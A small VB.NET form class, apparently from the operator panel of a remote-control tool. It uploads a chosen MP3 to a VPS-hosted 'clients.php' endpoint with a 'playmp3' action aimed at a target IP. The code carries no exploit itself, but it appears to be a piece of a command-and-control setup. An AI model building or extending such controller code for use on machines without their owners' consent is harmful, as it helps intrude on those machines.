Imports System.IO
Imports System.Net
Imports System.Text

Public Class MP3Player
    Public targetIp As String
    Public vpsurl As String = My.Settings.vpsurl
    Private Sub MP3Player_Load(sender As Object, e As EventArgs) Handles MyBase.Load

    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Dim client As New WebClient
        Dim fpath As String = OpenFileDialog1.FileName
        Dim s As String = "abcdefghijklmnopqrstvuwxyz"
        Dim r As New Random : Dim sb As New StringBuilder
        For i As Integer = 1 To 12
            Dim idx As Integer = r.Next(0, 26)
            sb.Append(s.Substring(idx, 1))
        Next
        Dim filename As String = sb.ToString()
        MsgBox(OpenFileDialog1.FileName)
        client.UploadFile(vpsurl & "clients.php?action=playmp3&target=" & targetIp & "&actioncontent=" & filename, OpenFileDialog1.FileName)
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        OpenFileDialog1.Filter = "Mp3 Files (*.mp3)|*.mp3"
        Dim result As DialogResult = OpenFileDialog1.ShowDialog()

        If result = Windows.Forms.DialogResult.OK Then
            TextBox1.Text = OpenFileDialog1.FileName
            Button2.Enabled = True
        End If
    End Sub
End Class